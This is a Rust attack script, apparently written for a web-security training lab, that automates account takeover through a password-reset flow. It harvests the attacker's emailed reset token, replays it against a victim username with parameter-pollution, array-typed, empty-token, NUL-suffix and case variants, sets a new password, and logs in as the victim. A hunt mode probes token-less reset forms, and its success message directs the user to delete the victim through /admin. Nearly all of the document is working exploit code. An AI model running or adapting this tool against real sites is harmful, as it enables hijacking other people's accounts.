#!/usr/bin/env rust-script
//! name: reset_tamper
//! description: Password-reset validation battery - harvests a freshly emailed token for the attacker account, confirms it is accepted for that account, then fires a variant battery at the victim's user value (parameter pollution, array-typed params, empty/absent token, trailing space, NUL suffix, stray flags) over both GET and POST and reports every receipt, so a missing or inconsistent user/token check is provable in one envelope. Any variant that stops answering 400 is flagged, and the driver then tries a login with the chosen new password.
//! version: 1.0.1
//! args: <base-url> [--me user] [--victim victim] [--new-password Hacked123!] [--inbox URL] [--jar PATH] [--settle-ms N] [--timeout-ms N] [--selftest]
//! keywords: 口令重置, reset token, 参数污染, 缺失校验, 类型混淆, race conditions 族, 账户接管
//!
//! ```cargo
//! [dependencies]
//! ureq = { version = "2" }
//! ```
use pi_rust_lib::serde_json::{json, Value};
use std::collections::BTreeMap;
use std::sync::{Arc, Mutex};
use std::time::Duration;

type Jar = Arc<Mutex<BTreeMap<String, String>>>;

fn arg(a: &[String], i: usize) -> String {
    a.get(i).cloned().unwrap_or_default()
}

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    if args.iter().any(|a| a == "--selftest") {
        selftest();
        return;
    }
    let mut base = String::new();
    let mut me = "user".to_string();
    let mut victim = "victim".to_string();
    let mut new_password = "Hacked123!".to_string();
    let mut inbox = String::new();
    let mut jar_path = String::new();
    let mut settle_ms: u64 = 1200;
    let mut timeout_ms: u64 = 15_000;
    let mut hunt = false;
    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--me" => { i += 1; me = arg(&args, i); }
            "--victim" => { i += 1; victim = arg(&args, i); }
            "--new-password" => { i += 1; new_password = arg(&args, i); }
            "--inbox" => { i += 1; inbox = arg(&args, i); }
            "--jar" => { i += 1; jar_path = arg(&args, i); }
            "--settle-ms" => { i += 1; settle_ms = arg(&args, i).parse().unwrap_or(1200); }
            "--hunt" => hunt = true,
            "--timeout-ms" => { i += 1; timeout_ms = arg(&args, i).parse().unwrap_or(15_000); }
            other if !other.starts_with("--") && base.is_empty() => base = other.to_string(),
            _ => {}
        }
        i += 1;
    }
    if base.is_empty() {
        pi_rust_lib::report::failure("reset_tamper", "need <base-url>", "usage: reset_tamper https://lab/ --me user --victim victim");
        return;
    }
    let base = base.trim_end_matches('/').to_string();
    let jar: Jar = Arc::new(Mutex::new(BTreeMap::new()));
    if !jar_path.is_empty() {
        if let Ok(raw) = std::fs::read_to_string(&jar_path) {
            if let Ok(v) = pi_rust_lib::serde_json::from_str::<Value>(&raw) {
                if let Some(inner) = v.as_object().and_then(|o| o.values().next()).and_then(|h| h.as_object()) {
                    let mut j = jar.lock().unwrap();
                    for (k, val) in inner {
                        j.insert(k.clone(), val.as_str().unwrap_or("").to_string());
                    }
                }
            }
        }
    }
    let agent = ureq::AgentBuilder::new().timeout(Duration::from_millis(timeout_ms)).build();
    if hunt {
        hunt_victim(&agent, &jar, &base, &victim, &new_password);
        return;
    }

    // 1) 自己先拿一个真令牌:请求重置 -> 读邮箱
    let (rst, rpage) = get(&agent, &jar, &format!("{}/forgot-password", base));
    let csrf = extract_csrf(&rpage).unwrap_or_default();
    if inbox.is_empty() {
        inbox = extract_exploit_link(&rpage).unwrap_or_default();
    }
    if csrf.is_empty() || inbox.is_empty() {
        pi_rust_lib::report::failure("reset_tamper", "missing csrf or inbox link", &format!("status={} csrf={} inbox={}", rst, csrf, inbox));
        return;
    }
    let (pst, _) = post(&agent, &jar, &format!("{}/forgot-password", base), &format!("csrf={}&username={}", csrf, me));
    std::thread::sleep(Duration::from_millis(settle_ms));
    let (ist, ibody) = get(&agent, &jar, &inbox);
    let tokens = extract_tokens(&ibody);
    let mine = tokens.first().cloned().unwrap_or_default();
    let sent = extract_first_sent(&ibody);
    let mut notes = vec![json!({
        "stage": "harvest", "reset_form_status": rst, "reset_post_status": pst,
        "inbox_status": ist, "inbox_sent": sent, "tokens_seen": tokens.len(),
        "my_token": mine.clone(),
    })];
    if mine.is_empty() {
        pi_rust_lib::report::failure("reset_tamper", "no emailed token found for the attacker account", "check --inbox / the mailbox address");
        return;
    }
    // 2) 控制组:自己用自己令牌应 200
    let (cst, cbody) = get(&agent, &jar, &format!("{}/forgot-password?user={}&token={}", base, me, mine));
    notes.push(json!({"stage": "control_self", "status": cst, "accepted": cst == 200, "body_head": head(&cbody, 80)}));

    // 3) 变体电池:全部打受害者,任何非 400 都值得看
    let np = &new_password;
    let variants: Vec<(&str, &str, String, String)> = vec![
        ("G", "user=victim&token=mine", format!("{}/forgot-password?user={}&token={}", base, victim, mine), String::new()),
        ("G", "user=victim&token=mine&user=me", format!("{}/forgot-password?user={}&token={}&user={}", base, victim, mine, me), String::new()),
        ("G", "user=me&token=mine&user=victim", format!("{}/forgot-password?user={}&token={}&user={}", base, me, mine, victim), String::new()),
        ("G", "user[]=victim&token=mine", format!("{}/forgot-password?user[]={}&token={}", base, victim, mine), String::new()),
        ("G", "user=victim&token[]=mine", format!("{}/forgot-password?user={}&token[]={}", base, victim, mine), String::new()),
        ("G", "user=victim&token=empty", format!("{}/forgot-password?user={}&token=", base, victim), String::new()),
        ("G", "user=victim (no token)", format!("{}/forgot-password?user={}", base, victim), String::new()),
        ("G", "token=mine only (no user)", format!("{}/forgot-password?token={}", base, mine), String::new()),
        ("G", "user=victim&token=mine&debug=1", format!("{}/forgot-password?user={}&token={}&debug=1", base, victim, mine), String::new()),
        ("G", "user=victim%20&token=mine", format!("{}/forgot-password?user={}%20&token={}", base, victim, mine), String::new()),
        ("G", "user=victim&token=mine%00", format!("{}/forgot-password?user={}&token={}%00", base, victim, mine), String::new()),
        ("G", "user=victim%00me&token=mine", format!("{}/forgot-password?user={}%00{}&token={}", base, victim, me, mine), String::new()),
        ("G", "user=victim&token=mine&token=empty", format!("{}/forgot-password?user={}&token={}&token=", base, victim, mine), String::new()),
        ("G", "user=VICTIM&token=mine", format!("{}/forgot-password?user={}&token={}", base, victim.to_uppercase(), mine), String::new()),
        ("P", "post user=victim&token=mine", format!("{}/forgot-password", base), format!("csrf={}&user={}&token={}&new-password-1={}&new-password-2={}", csrf, victim, mine, np, np)),
        ("P", "post user=victim&user=me&token=mine", format!("{}/forgot-password", base), format!("csrf={}&user={}&user={}&token={}&new-password-1={}&new-password-2={}", csrf, victim, me, mine, np, np)),
        ("P", "post user=me&user=victim&token=mine", format!("{}/forgot-password", base), format!("csrf={}&user={}&user={}&token={}&new-password-1={}&new-password-2={}", csrf, me, victim, mine, np, np)),
        ("P", "post user[]=victim&token=mine", format!("{}/forgot-password", base), format!("csrf={}&user[]={}&token={}&new-password-1={}&new-password-2={}", csrf, victim, mine, np, np)),
        ("P", "post user=victim&token[]=mine", format!("{}/forgot-password", base), format!("csrf={}&user={}&token[]={}&new-password-1={}&new-password-2={}", csrf, victim, mine, np, np)),
        ("P", "post user=victim&token=empty", format!("{}/forgot-password", base), format!("csrf={}&user={}&token=&new-password-1={}&new-password-2={}", csrf, victim, np, np)),
        ("P", "post user=victim (no token)", format!("{}/forgot-password", base), format!("csrf={}&user={}&new-password-1={}&new-password-2={}", csrf, victim, np, np)),
        ("P", "post username=victim only", format!("{}/forgot-password", base), format!("csrf={}&username={}", csrf, victim)),
    ];
    let mut receipts = Vec::new();
    let mut interesting = Vec::new();
    for (kind, label, url, body) in variants {
        let (st, resp) = if kind == "G" {
            get(&agent, &jar, &url)
        } else {
            post(&agent, &jar, &url, &body)
        };
        if st != 400 {
            interesting.push(json!({"label": label, "status": st}));
        }
        receipts.push(json!({"label": label, "method": kind, "status": st, "body_head": head(&resp, 90)}));
    }
    // 4) 若有任何非 400,试一次受害者登录
    let mut login = Value::Null;
    if !interesting.is_empty() {
        let (_, lpage) = get(&agent, &jar, &format!("{}/login", base));
        let lcsrf = extract_csrf(&lpage).unwrap_or_default();
        let (lst, lbody) = post(
            &agent,
            &jar,
            &format!("{}/login", base),
            &format!("csrf={}&username={}&password={}", lcsrf, victim, new_password),
        );
        let (mst, mbody) = get(&agent, &jar, &format!("{}/my-account", base));
        login = json!({
            "login_status": lst, "login_head": head(&lbody, 90),
            "my_account_status": mst,
            "logged_in_as_victim": mbody.contains("Log out") || mbody.contains(&victim),
        });
    }
    let data = json!({
        "notes": notes, "receipts": receipts,
        "non_400": interesting, "login_attempt": login,
    });
    pi_rust_lib::report::success(
        "reset_tamper",
        data,
        "if nothing stopped answering 400, the check is strict and the token must be forged/predicted instead",
    )
    .expect("report");
}

fn head(s: &str, n: usize) -> String {
    s.chars().take(n).collect()
}

/// 表单隐藏域提取:name 与 value 两种属性顺序都认。
fn extract_input(html: &str, name: &str) -> Option<String> {
    for marker in [format!("name=\"{}\"", name), format!("name='{}'", name)] {
        if let Some(pos) = html.find(&marker) {
            let before = &html[..pos];
            if let Some(vpos) = before.rfind("value=") {
                let rest = &before[vpos + 6..];
                let quote = rest.chars().next()?;
                if quote == '"' || quote == '\'' {
                    if let Some(end) = rest[1..].find(quote) {
                        return Some(rest[1..1 + end].to_string());
                    }
                }
            }
            let after = &html[pos..];
            if let Some(vpos) = after.find("value=") {
                let rest = &after[vpos + 6..];
                let quote = rest.chars().next()?;
                if quote == '"' || quote == '\'' {
                    if let Some(end) = rest[1..].find(quote) {
                        return Some(rest[1..1 + end].to_string());
                    }
                }
            }
        }
    }
    None
}

/// 缺失令牌追踪:先给受害者发一次重置(建行),再逐条送无令牌/数组令牌类请求,
/// 每条都看返回的表单到底是给谁的、带什么隐藏域,最后用表单自己的值试一次改密+登录。
fn hunt_victim(agent: &ureq::Agent, jar: &Jar, base: &str, victim: &str, new_password: &str) {
    let (fs, fpage) = get(agent, jar, &format!("{}/forgot-password", base));
    let csrf0 = extract_csrf(&fpage).unwrap_or_default();
    let (pst, _) = post(
        agent,
        jar,
        &format!("{}/forgot-password", base),
        &format!("csrf={}&username={}", csrf0, victim),
    );
    let probes = vec![
        ("no-token", format!("{}/forgot-password?user={}", base, victim)),
        ("empty-token", format!("{}/forgot-password?user={}&token=", base, victim)),
        ("array-token", format!("{}/forgot-password?user={}&token[]=", base, victim)),
        ("array-user", format!("{}/forgot-password?user[]={}", base, victim)),
    ];
    let mut rows = Vec::new();
    let mut best: Option<(String, String, String, String)> = None; // label, csrf, token, user
    for (label, url) in &probes {
        let (st, body) = get(agent, jar, url);
        let form_user = extract_input(&body, "user").unwrap_or_default();
        let form_token = extract_input(&body, "token").unwrap_or_default();
        let form_csrf = extract_csrf(&body).unwrap_or_default();
        let has_pw_field = body.contains("new-password-1");
        rows.push(json!({
            "label": label, "status": st, "has_password_field": has_pw_field,
            "form_user": form_user, "form_token": form_token,
            "form_csrf": !form_csrf.is_empty(), "body_len": body.len(),
        }));
        if st == 200 && has_pw_field && best.is_none() {
            best = Some((label.to_string(), form_csrf.clone(), form_token.clone(), form_user.clone()));
        }
    }
    let mut submits = Vec::new();
    let mut login = Value::Null;
    if let Some((label, csrf, form_token, form_user)) = best.clone() {
        let _ = &label;
        let attempts: Vec<(&str, String, String)> = vec![
            ("form-values", form_token.clone(), form_user.clone()),
            ("empty-token", String::new(), victim.to_string()),
            ("victim-user", form_token.clone(), victim.to_string()),
        ];
        for (alabel, tok, usr) in attempts {
            let (cst, cpage) = get(agent, jar, &format!("{}/forgot-password?user={}", base, victim));
            let acsrf = extract_csrf(&cpage).unwrap_or_else(|| csrf.clone());
            let body = format!(
                "csrf={}&user={}&token={}&new-password-1={}&new-password-2={}",
                acsrf, usr, tok, new_password, new_password
            );
            let (sst, sbody) = post(agent, jar, &format!("{}/forgot-password", base), &body);
            let ok = sst == 200 && !sbody.contains("Invalid");
            submits.push(json!({
                "label": alabel, "status": sst, "ok": ok,
                "form_page_status": cst, "body_head": head(&sbody, 100),
                "user": usr, "token": tok,
            }));
        }
        let (_, lpage) = get(agent, jar, &format!("{}/login", base));
        let lcsrf = extract_csrf(&lpage).unwrap_or_default();
        let (lst, lbody) = post(
            agent,
            jar,
            &format!("{}/login", base),
            &format!("csrf={}&username={}&password={}", lcsrf, victim, new_password),
        );
        let (mst, mbody) = get(agent, jar, &format!("{}/my-account", base));
        login = json!({
            "login_status": lst, "redirected_to_account": lbody.contains("my-account") || lbody.contains("Your username is"),
            "my_account_status": mst,
            "logged_in_as_victim": mbody.contains(victim),
            "victim_profile_seen": mbody.contains("Your username") && mbody.contains(victim),
        });
    }
    let data = json!({
        "mode": "hunt", "form_status": fs, "carol_reset_request_status": pst,
        "probes": rows, "chosen": best.as_ref().map(|(l, _, t, u)| json!({"label": l, "token": t, "user": u})),
        "submits": submits, "login": login,
    });
    let solved = !login.is_null() && login["logged_in_as_victim"].as_bool().unwrap_or(false);
    pi_rust_lib::report::success(
        "reset_tamper",
        data,
        if solved {
            "victim session obtained - delete the victim through /admin and confirm the banner"
        } else {
            "no victim session yet: check which submit stopped saying Invalid and what the form echoed"
        },
    )
    .expect("report");
}

fn cookie_header(jar: &Jar) -> Option<String> {
    let j = jar.lock().unwrap();
    if j.is_empty() {
        None
    } else {
        Some(j.iter().map(|(k, v)| format!("{}={}", k, v)).collect::<Vec<_>>().join("; "))
    }
}

fn absorb_cookies(jar: &Jar, resp: &ureq::Response) {
    let mut j = jar.lock().unwrap();
    for val in resp.all("set-cookie") {
        if let Some((pair, _)) = val.split_once(';') {
            if let Some((name, value)) = pair.split_once('=') {
                j.insert(name.trim().to_string(), value.trim().to_string());
            }
        }
    }
}

fn get(agent: &ureq::Agent, jar: &Jar, url: &str) -> (u32, String) {
    let mut req = agent.get(url);
    if let Some(c) = cookie_header(jar) {
        req = req.set("Cookie", &c);
    }
    match req.call() {
        Ok(resp) => {
            let st = resp.status() as u32;
            absorb_cookies(jar, &resp);
            (st, resp.into_string().unwrap_or_default())
        }
        Err(ureq::Error::Status(st, resp)) => (st as u32, resp.into_string().unwrap_or_default()),
        Err(e) => (0, format!("transport: {}", e)),
    }
}

fn post(agent: &ureq::Agent, jar: &Jar, url: &str, body: &str) -> (u32, String) {
    let mut req = agent.post(url).set("Content-Type", "application/x-www-form-urlencoded");
    if let Some(c) = cookie_header(jar) {
        req = req.set("Cookie", &c);
    }
    match req.send_string(body) {
        Ok(resp) => {
            let st = resp.status() as u32;
            absorb_cookies(jar, &resp);
            (st, resp.into_string().unwrap_or_default())
        }
        Err(ureq::Error::Status(st, resp)) => (st as u32, resp.into_string().unwrap_or_default()),
        Err(e) => (0, format!("transport: {}", e)),
    }
}

fn extract_csrf(html: &str) -> Option<String> {
    for marker in ["name=\"csrf\"", "name='csrf'"] {
        if let Some(pos) = html.find(marker) {
            let tail = &html[pos..];
            if let Some(vpos) = tail.find("value=") {
                let rest = &tail[vpos + 6..];
                let quote = rest.chars().next()?;
                if quote == '"' || quote == '\'' {
                    let end = rest[1..].find(quote)?;
                    return Some(rest[1..1 + end].to_string());
                }
            }
        }
    }
    None
}

fn extract_exploit_link(html: &str) -> Option<String> {
    let needle = "exploit-server.net/email";
    let idx = html.find(needle)?;
    let start = html[..idx].rfind('\'')? + 1;
    Some(html[start..idx + needle.len()].to_string())
}

fn extract_tokens(html: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut i = 0;
    while i + 46 <= html.len() {
        if &html[i..i + 6] == "token=" {
            let cand = &html[i + 6..i + 46];
            if cand.chars().all(|c| c.is_ascii_hexdigit()) && cand.chars().any(|c| c.is_ascii_alphabetic()) {
                let owned = cand.to_string();
                if !out.contains(&owned) {
                    out.push(owned);
                }
            }
            i += 46;
        } else {
            i += 1;
        }
    }
    out
}

fn extract_first_sent(html: &str) -> String {
    match html.find("2026-") {
        Some(pos) if pos + 19 <= html.len() => html[pos..pos + 19].to_string(),
        _ => String::new(),
    }
}

fn selftest() {
    let page = "<input name=\"csrf\" value=\"abc123\">";
    assert_eq!(extract_csrf(page).unwrap(), "abc123");
    let mail = "href='https://lab/forgot-password?user=user&token=abcdef0123456789abcdef0123456789abcdef01'";
    let t = extract_tokens(mail);
    assert_eq!(t.len(), 1);
    assert_eq!(extract_first_sent("<td>2026-10-10 02:03:52 +0000</td>"), "2026-10-10 02:03:52");
    let hdr = "href='https://exploit-abc.exploit-server.net/email'";
    assert_eq!(extract_exploit_link(hdr).unwrap(), "https://exploit-abc.exploit-server.net/email");
    pi_rust_lib::report::success(
        "reset_tamper",
        json!({"selftest": "ok", "checks": ["csrf", "tokens", "sent", "exploit-link"]}),
        "run: reset_tamper https://lab/ --me user --victim victim",
    )
    .expect("report");
}
